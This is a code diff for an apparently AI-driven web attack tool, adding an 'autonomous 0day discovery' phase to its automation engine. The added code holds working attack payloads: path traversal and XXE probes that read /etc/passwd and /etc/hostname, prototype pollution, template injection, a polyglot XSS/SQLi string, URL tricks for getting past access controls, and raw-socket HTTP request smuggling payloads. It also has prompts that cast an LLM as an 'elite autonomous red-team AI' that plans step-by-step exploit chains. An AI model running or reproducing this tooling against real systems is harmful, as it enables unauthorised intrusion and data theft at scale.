@@ -10,6 +10,8 @@ import { OllamaClient } from './ollama_client.js';
 import { PayloadOven } from './payload_oven.js';
 import { ToolManager } from './tool_manager.js';
 import { MemoryManager } from './memory_manager.js';
+import * as net from 'net';
+import * as tls from 'tls';
 
 // Configure stealth
 puppeteer.use(StealthPlugin());
@@ -1179,6 +1181,372 @@ export class AutomationEngine {
             allFindings.push({ phase: 'Phase 4', type: 'AI PoC Reports', data: pocData.pocs });
           }
         }
+
+        // --- PHASE 4d: AUTONOMOUS 0DAY DISCOVERY ---
+        this.log(jobId, 'info', 'Phase 4d: Autonomous 0day Discovery');
+
+        const zerodayTargets = prioritizedEndpoints.slice(0, 30);
+
+        // 4d-1: Behavioral Anomaly Fuzzing — edge-case inputs that trigger parser bugs
+        this.log(jobId, 'info', 'Phase 4d-1: Behavioral Anomaly Fuzzing');
+        const anomalyProbes: { name: string; value: string; markers: string[] }[] = [
+          { name: 'Overlong UTF-8', value: '%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd', markers: ['root:', '/bin/'] },
+          { name: 'Null byte injection', value: 'test%00.html', markers: ['error', 'exception', 'stack'] },
+          { name: 'Format string', value: '%s%s%s%s%s%s%s%s%s%s%n%n%n%n', markers: ['segfault', 'SIGSEGV', 'core dump', 'format'] },
+          { name: 'Integer overflow', value: '99999999999999999999999999999999', markers: ['overflow', 'range', 'conversion', 'NaN', 'Infinity'] },
+          { name: 'Negative index', value: '-1', markers: ['index', 'range', 'bound', 'underflow'] },
+          { name: 'Prototype pollution', value: '__proto__[isAdmin]=true', markers: ['prototype', 'isAdmin', '__proto__'] },
+          { name: 'Proto pollution JSON', value: '{"__proto__":{"isAdmin":true}}', markers: ['prototype', 'isAdmin'] },
+          { name: 'Java deserialization', value: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA', markers: ['java.io', 'ClassNotFoundException', 'ObjectInputStream', 'deserialization'] },
+          { name: 'PHP object injection', value: 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}', markers: ['unserialize', 'Object of class', '__wakeup'] },
+          { name: 'CRLF injection', value: 'test%0d%0aInjected-Header:%20true', markers: ['Injected-Header', 'injected-header'] },
+          { name: 'Unicode normalization', value: '\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd', markers: ['root:', '/bin/'] },
+          { name: 'Template expression', value: '${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}', markers: ['49'] },
+          { name: 'XML entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', markers: ['ENTITY', 'hostname', 'xxe'] },
+          { name: 'GraphQL introspection', value: '{"query":"{__schema{types{name}}}"}', markers: ['__schema', '__type', 'queryType'] },
+          { name: 'Polyglot XSS/SQLi', value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", markers: ['alert', 'oNcliCk', 'oNloAd'] },
+        ];
+
+        // Fetch baseline for anomaly comparison
+        const anomalyBaselines = new Map<string, { status: number; length: number; latency: number }>();
+        for (const ep of zerodayTargets.slice(0, 15)) {
+          try {
+            const start = Date.now();
+            const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
+            anomalyBaselines.set(ep.url, {
+              status: res.status,
+              length: (typeof res.data === 'string' ? res.data : JSON.stringify(res.data)).length,
+              latency: Date.now() - start,
+            });
+          } catch {}
+        }
+
+        let anomalyCount = 0;
+        for (const ep of zerodayTargets.slice(0, 15)) {
+          if (anomalyCount >= 10) break;
+          const baseline = anomalyBaselines.get(ep.url);
+          if (!baseline) continue;
+
+          for (const probe of anomalyProbes) {
+            try {
+              const separator = ep.url.includes('?') ? '&' : '?';
+              const testUrl = `${ep.url}${separator}zd=${encodeURIComponent(probe.value)}`;
+
+              const start = Date.now();
+              const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true });
+              const latency = Date.now() - start;
+              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
+              const bodyLen = bodyStr.length;
+
+              const statusShift = res.status !== baseline.status;
+              const sizeAnomaly = Math.abs(bodyLen - baseline.length) > baseline.length * 0.5 && bodyLen > 200;
+              const latencySpike = latency > baseline.latency * 3 && latency > 2000;
+              const markerHit = probe.markers.some(m => bodyStr.toLowerCase().includes(m.toLowerCase()));
+              const errorLeak = /exception|stacktrace|traceback|fatal|panic|segfault|core dump|syntax error|unexpected token/i.test(bodyStr);
+
+              if ((statusShift && res.status >= 500) || markerHit || errorLeak || (sizeAnomaly && latencySpike)) {
+                const evidence: string[] = [];
+                if (statusShift) evidence.push(`Status shift: ${baseline.status} → ${res.status}`);
+                if (sizeAnomaly) evidence.push(`Size anomaly: ${baseline.length} → ${bodyLen}`);
+                if (latencySpike) evidence.push(`Latency spike: ${baseline.latency}ms → ${latency}ms`);
+                if (markerHit) evidence.push(`Marker hit: ${probe.markers.filter(m => bodyStr.toLowerCase().includes(m.toLowerCase())).join(', ')}`);
+                if (errorLeak) evidence.push(`Error leak detected in response`);
+
+                if (ai) {
+                  const analysisPrompt = `As an elite security researcher, analyze this behavioral anomaly for potential 0day vulnerability.
+
+Endpoint: ${ep.url}
+Probe Type: ${probe.name}
+Probe Value: ${probe.value}
+Evidence: ${evidence.join(' | ')}
+Response Status: ${res.status}
+Response Body Snippet: ${bodyStr.substring(0, 2000)}
+Baseline: Status ${baseline.status}, Size ${baseline.length}, Latency ${baseline.latency}ms
+Tech Stack: ${discoveredInfo.identifiers ? JSON.stringify(discoveredInfo.identifiers) : 'unknown'}
+
+Determine if this anomaly indicates a real exploitable vulnerability (potential 0day).
+Consider: parser differential, memory corruption indicators, deserialization, injection bypass, access control failure.
+Rate severity: CRITICAL (RCE/data breach), HIGH (auth bypass/info leak), MEDIUM (DoS/limited impact).
+Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "severity": string, "cve_similar": string | null }`;
+
+                  const analysis = safeJsonParse<AiVulnResult & { severity?: string; cve_similar?: string | null }>(
+                    await ai.generate(analysisPrompt, true), { ...NULL_VULN, severity: 'UNKNOWN', cve_similar: null }
+                  );
+
+                  if (analysis.isVulnerable && analysis.confidence > 0.7) {
+                    this.log(jobId, 'vuln', `0DAY CANDIDATE [${probe.name}]: ${analysis.gap_identified}`, {
+                      endpoint: ep.url, probe: probe.name, evidence, severity: analysis.severity,
+                      explanation: analysis.explanation, chain: analysis.chain_potential, cve_similar: analysis.cve_similar
+                    });
+                    MemoryManager.addFinding(jobId, hostname, {
+                      type: '0day Candidate', endpoint: ep.url, probe: probe.name,
+                      gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
+                      evidence, severity: analysis.severity
+                    });
+                    anomalyCount++;
+                  }
+                } else {
+                  this.log(jobId, 'vuln', `BEHAVIORAL ANOMALY [${probe.name}]: ${ep.url}`, { evidence });
+                  MemoryManager.addFinding(jobId, hostname, {
+                    type: '0day Candidate', endpoint: ep.url, probe: probe.name,
+                    gap: `Behavioral anomaly: ${evidence.join('; ')}`, chain_potential: null, evidence
+                  });
+                  anomalyCount++;
+                }
+              }
+            } catch {}
+          }
+        }
+        this.log(jobId, 'info', `Phase 4d-1 complete: ${anomalyCount} behavioral anomaly(ies) flagged`);
+
+        // 4d-2: Differential Response Analysis — semantically equivalent requests, structural differences
+        this.log(jobId, 'info', 'Phase 4d-2: Differential Response Analysis');
+        let diffCount = 0;
+        for (const ep of zerodayTargets.slice(0, 10)) {
+          if (diffCount >= 5) break;
+          try {
+            const variants = [
+              { name: 'Case variation', url: ep.url.replace(/\/([a-z])/g, (_, c: string) => `/${c.toUpperCase()}`) },
+              { name: 'Trailing dot', url: ep.url.replace(/(https?:\/\/[^/]+)/, '$1.') },
+              { name: 'Double slash', url: ep.url.replace(/(https?:\/\/[^/]+)(\/.*)?$/, '$1/$2') },
+              { name: 'Tab in path', url: ep.url.replace(/\/([^/]+)$/, '/\t$1') },
+              { name: 'Semicolon path', url: ep.url.replace(/\/([^/]+)$/, '/;$1') },
+              { name: 'URL-encoded slash', url: ep.url.replace(/\/([^/]+)$/, '%2f$1') },
+            ];
+
+            const baseRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
+            if (!baseRes) continue;
+
+            const baseBody = typeof baseRes.data === 'string' ? baseRes.data : JSON.stringify(baseRes.data);
+
+            for (const variant of variants) {
+              try {
+                const varRes = await axios.get(variant.url, { timeout: 5000, validateStatus: () => true });
+                const varBody = typeof varRes.data === 'string' ? varRes.data : JSON.stringify(varRes.data);
+
+                const statusDiff = baseRes.status !== varRes.status;
+                const accessEscalation = baseRes.status === 403 && varRes.status === 200;
+                const contentDiff = baseBody !== varBody && Math.abs(baseBody.length - varBody.length) > 100;
+
+                if (accessEscalation || (statusDiff && contentDiff)) {
+                  this.log(jobId, 'vuln', `DIFFERENTIAL ANOMALY [${variant.name}]: ${ep.url}`, {
+                    original: { status: baseRes.status, length: baseBody.length },
+                    variant: { status: varRes.status, length: varBody.length, url: variant.url },
+                    accessEscalation
+                  });
+
+                  if (ai) {
+                    const diffPrompt = `Analyze this differential response anomaly for access control bypass or parser differential vulnerability.
+
+Original URL: ${ep.url} → Status ${baseRes.status}, Body size ${baseBody.length}
+Variant URL (${variant.name}): ${variant.url} → Status ${varRes.status}, Body size ${varBody.length}
+${accessEscalation ? 'ACCESS ESCALATION DETECTED: 403 → 200' : ''}
+Original body snippet: ${baseBody.substring(0, 500)}
+Variant body snippet: ${varBody.substring(0, 500)}
+
+Is this a real access control bypass or parser differential vulnerability?
+Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
+
+                    const analysis = safeJsonParse<AiVulnResult>(await ai.generate(diffPrompt, true), NULL_VULN);
+                    if (analysis.isVulnerable && analysis.confidence > 0.7) {
+                      MemoryManager.addFinding(jobId, hostname, {
+                        type: '0day Candidate', subtype: 'Parser Differential',
+                        endpoint: ep.url, variant: variant.url, technique: variant.name,
+                        gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
+                        accessEscalation
+                      });
+                      diffCount++;
+                    }
+                  } else if (accessEscalation) {
+                    MemoryManager.addFinding(jobId, hostname, {
+                      type: '0day Candidate', subtype: 'Access Control Bypass',
+                      endpoint: ep.url, variant: variant.url, technique: variant.name,
+                      gap: `403→200 via ${variant.name}`, chain_potential: 'Direct unauthorized access'
+                    });
+                    diffCount++;
+                  }
+                }
+              } catch {}
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4d-2 complete: ${diffCount} differential anomaly(ies) found`);
+
+        // 4d-3: HTTP Request Smuggling Detection (raw TCP sockets to bypass Node.js re-chunking)
+        this.log(jobId, 'info', 'Phase 4d-3: HTTP Request Smuggling Detection');
+        let smuggleCount = 0;
+
+        const rawHttpRequest = (host: string, port: number, useTls: boolean, rawPayload: string, timeoutMs: number = 8000): Promise<string> => {
+          return new Promise((resolve) => {
+            let response = '';
+            const onData = (data: Buffer) => { response += data.toString(); };
+            const onEnd = () => resolve(response);
+            const onError = () => resolve('');
+            const onTimeout = () => { socket.destroy(); resolve(response || ''); };
+
+            let socket: net.Socket | tls.TLSSocket;
+            if (useTls) {
+              socket = tls.connect({ host, port, rejectUnauthorized: false }, () => socket.write(rawPayload));
+            } else {
+              socket = net.createConnection({ host, port }, () => socket.write(rawPayload));
+            }
+            socket.setTimeout(timeoutMs);
+            socket.on('data', onData);
+            socket.on('end', onEnd);
+            socket.on('error', onError);
+            socket.on('timeout', onTimeout);
+          });
+        };
+
+        for (const asset of discoveredAssets.slice(0, 5)) {
+          if (smuggleCount >= 3) break;
+          try {
+            const parsed = new URL(asset);
+            const host = parsed.hostname;
+            const useTls = parsed.protocol === 'https:';
+            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);
+
+            // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
+            const cltePayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX`;
+            const clteResponse = await rawHttpRequest(host, port, useTls, cltePayload);
+
+            // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
+            const teclPayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
+            const teclResponse = await rawHttpRequest(host, port, useTls, teclPayload);
+
+            // Extract status codes from raw responses
+            const clteStatus = clteResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';
+            const teclStatus = teclResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';
+
+            // Strong smuggling indicators: look for desync evidence, not just status diffs
+            const hasGPOST = /GPOST|unrecognized method|invalid method/i.test(teclResponse);
+            const hasTimeout = clteResponse === '' && teclResponse !== '';
+            const hasDesync = (clteStatus === '400' && teclStatus !== '400') || (teclStatus === '400' && clteStatus !== '400');
+            const strongIndicator = hasGPOST || hasTimeout || (hasDesync && /smuggl|chunk|transfer/i.test(clteResponse + teclResponse));
+
+            if (strongIndicator) {
+              const evidence = [];
+              if (hasGPOST) evidence.push('GPOST method reflected in response');
+              if (hasTimeout) evidence.push('CL.TE timeout (potential desync)');
+              if (hasDesync) evidence.push(`Status desync: CL.TE=${clteStatus}, TE.CL=${teclStatus}`);
+
+              this.log(jobId, 'vuln', `HTTP SMUGGLING INDICATOR on ${asset}`, {
+                clte: { status: clteStatus, body: clteResponse.substring(0, 300) },
+                tecl: { status: teclStatus, body: teclResponse.substring(0, 300) },
+                evidence,
+              });
+
+              if (ai) {
+                const smugglePrompt = `Analyze these HTTP request smuggling test results for ${asset}.
+
+CL.TE raw response: ${clteResponse.substring(0, 500)}
+TE.CL raw response: ${teclResponse.substring(0, 500)}
+Evidence: ${evidence.join(' | ')}
+
+These were sent as raw TCP payloads (no HTTP library normalization).
+Determine if this indicates a real HTTP request smuggling vulnerability.
+Consider CL.TE, TE.CL, and TE.TE variants. Look for response desync indicators.
+Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
+
+                const analysis = safeJsonParse<AiVulnResult>(await ai.generate(smugglePrompt, true), NULL_VULN);
+                if (analysis.isVulnerable && analysis.confidence > 0.6) {
+                  MemoryManager.addFinding(jobId, hostname, {
+                    type: '0day Candidate', subtype: 'HTTP Request Smuggling',
+                    endpoint: asset, gap: analysis.gap_identified,
+                    chain_potential: analysis.chain_potential || 'Cache poisoning, request hijacking, auth bypass'
+                  });
+                  smuggleCount++;
+                }
+              }
+              // No AI fallback: only record if we have the strongest indicator (GPOST reflection)
+              else if (hasGPOST) {
+                MemoryManager.addFinding(jobId, hostname, {
+                  type: '0day Candidate', subtype: 'HTTP Request Smuggling',
+                  endpoint: asset, gap: 'GPOST method reflected — request smuggling desync confirmed',
+                  chain_potential: 'Cache poisoning, request hijacking, auth bypass'
+                });
+                smuggleCount++;
+              }
+            }
+
+            // HTTP/2 downgrade detection
+            try {
+              const h2Res = await axios.get(asset, {
+                timeout: 5000, validateStatus: () => true,
+                headers: { 'Connection': 'Upgrade, HTTP2-Settings', 'Upgrade': 'h2c', 'HTTP2-Settings': 'AAMAAABkAAQAAP__' },
+              });
+              if (h2Res.status === 101 || (h2Res.headers['upgrade'] || '').includes('h2c')) {
+                this.log(jobId, 'vuln', `H2C SMUGGLING POSSIBLE on ${asset}`);
+                MemoryManager.addFinding(jobId, hostname, {
+                  type: '0day Candidate', subtype: 'H2C Smuggling',
+                  endpoint: asset, gap: 'Server accepts h2c upgrade — HTTP/2 cleartext smuggling possible',
+                  chain_potential: 'Bypass reverse proxy auth, access internal endpoints'
+                });
+                smuggleCount++;
+              }
+            } catch {}
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4d-3 complete: ${smuggleCount} smuggling indicator(s) found`);
+
+        // 4d-4: AI-Driven 0day Chain Synthesis — correlate all findings for novel attack chains
+        if (ai) {
+          this.log(jobId, 'info', 'Phase 4d-4: AI-Driven 0day Chain Synthesis');
+          const memory = MemoryManager.getMemory(jobId, hostname);
+          const allFindingsSummary = memory.findings.slice(-30).map((f: Record<string, unknown>) => ({
+            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap, chain: f.chain_potential
+          }));
+
+          if (allFindingsSummary.length >= 2) {
+            const chainPrompt = `You are an elite autonomous red-team AI (argila). Analyze all discovered findings for this target and synthesize novel 0day attack chains.
+
+Target: ${targetUrl}
+Tech Stack: ${JSON.stringify(discoveredInfo)}
+Total Findings: ${allFindingsSummary.length}
+
+Findings Summary:
+${JSON.stringify(allFindingsSummary, null, 2)}
+
+Your task:
+1. Identify findings that can be CHAINED together to create a higher-impact exploit (e.g., CORS + SSRF = internal service access; open redirect + JWT weakness = token theft)
+2. Look for novel combinations that wouldn't be caught by standard scanners
+3. Propose attack chains with step-by-step exploitation paths
+4. Rate each chain's severity and feasibility
+
+Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used": string[], "severity": "CRITICAL"|"HIGH"|"MEDIUM", "feasibility": number, "impact": string, "novelty": string } ] }`;
+
+            const chainResult = safeJsonParse<{ chains: { name: string; steps: string[]; findings_used: string[]; severity: string; feasibility: number; impact: string; novelty: string }[] }>(
+              await ai.generate(chainPrompt, true), { chains: [] }
+            );
+
+            for (const chain of chainResult.chains.filter(c => c.feasibility > 0.6)) {
+              this.log(jobId, 'vuln', `0DAY CHAIN [${chain.severity}]: ${chain.name}`, {
+                steps: chain.steps, findings_used: chain.findings_used,
+                impact: chain.impact, novelty: chain.novelty, feasibility: chain.feasibility
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: '0day Chain', name: chain.name, steps: chain.steps,
+                findings_used: chain.findings_used, severity: chain.severity,
+                gap: chain.impact, chain_potential: chain.novelty
+              });
+            }
+            this.log(jobId, 'info', `Phase 4d-4 complete: ${chainResult.chains.filter(c => c.feasibility > 0.6).length} viable chain(s) synthesized`);
+          } else {
+            this.log(jobId, 'info', 'Phase 4d-4: Insufficient findings for chain synthesis (need 2+)');
+          }
+        }
+
+        // Collect all Phase 4d findings into allFindings for the final report
+        const phase4dMemory = MemoryManager.getMemory(jobId, hostname);
+        const phase4dFindings = phase4dMemory.findings.filter((f: Record<string, unknown>) => f.type === '0day Candidate' || f.type === '0day Chain');
+        if (phase4dFindings.length > 0) {
+          allFindings.push({ phase: 'Phase 4d', type: '0day Discovery Results', data: phase4dFindings });
+          vulnerabilities.push(...phase4dFindings.map((f: Record<string, unknown>) => ({
+            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap,
+            severity: f.severity || 'HIGH', phase: 'Phase 4d'
+          })));
+        }
+        this.log(jobId, 'info', `Phase 4d complete: ${phase4dFindings.length} 0day finding(s) added to report`);
 
         // --- PHASE 5: REPORTING (FINAL SYNTHESIS) ---
         this.updateJob(jobId, 'running', 'Phase 5: Reporting');
